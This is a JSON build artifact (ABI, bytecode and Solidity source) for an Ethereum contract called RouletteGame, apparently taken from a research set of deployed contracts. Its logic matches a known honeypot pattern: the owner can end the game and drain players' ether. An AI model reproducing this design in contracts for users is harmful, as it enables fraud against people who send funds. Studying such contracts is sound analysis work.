{
  "contractName": "RouletteGame",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "rouletteOwner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "result",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "finished",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_bet",
          "type": "uint8"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "StartRoulette",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060006101000a81548160ff021916908360ff16021790555060008060016101000a81548160ff02191690831515021790555034801561004557600080fd5b5061044d806100556000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063039997951461007a57806365372147146100d1578063b2c3609b14610102578063bef4876b14610125578063f1b6315e14610154578063f50ab24714610177575b005b34801561008657600080fd5b5061008f610181565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100dd57600080fd5b506100e66101a7565b604051808260ff1660ff16815260200191505060405180910390f35b610123600480360381019080803560ff1690602001909291905050506101b9565b005b34801561013157600080fd5b5061013a6102a4565b604051808215151515815260200191505060405180910390f35b610175600480360381019080803560ff1690602001909291905050506102b7565b005b61017f610330565b005b600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900460ff1681565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156101f357600080fd5b8060ff166000809054906101000a900460ff1660ff1614801561021c575066038d7ea4c6800034115b80156102355750600060019054906101000a900460ff16155b156102a1573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610297573d6000803e3d6000fd5b506102a0610404565b5b50565b600060019054906101000a900460ff1681565b60008060009054906101000a900460ff1660ff16141561032d57806000806101000a81548160ff021916908360ff16021790555033600060026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561038c57600080fd5b610394610404565b66038d7ea4c68000341115610402573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610400573d6000803e3d6000fd5b505b565b6001600060016101000a81548160ff0219169083151502179055505600a165627a7a7230582001df254cb08a8ee1cdc5770b87159df67bca57db893928b55fb45ea6be3cc92a0029",
  "source": "\n\ncontract RouletteGame\n{\n\n    uint8 public result = 0;\n    \n    bool public finished = false;\n    \n    address public rouletteOwner;\n\n    function Play(uint8 _bet)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        if(result == _bet && msg.value>0.001 ether && !finished)\n        {\n            msg.sender.transfer(this.balance);\n            GiftHasBeenSent();\n        }\n    }\n\n    function StartRoulette(uint8 _number)\n    public\n    payable\n    {\n        if(result==0)\n        {\n            result = _number;\n            rouletteOwner = msg.sender;\n        }\n    }\n\n    function StopGame()\n    public\n    payable\n    {\n        require(msg.sender == rouletteOwner);\n        GiftHasBeenSent();\n        if (msg.value>0.001 ether){\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function GiftHasBeenSent()\n    private\n    {\n        finished = true;\n    }\n\n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0xb6f6f6f47e92e517876d30c04198f45a3bc1b281/contracts/0xb6f6f6f47e92e517876d30c04198f45a3bc1b281.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T04:04:49.017Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}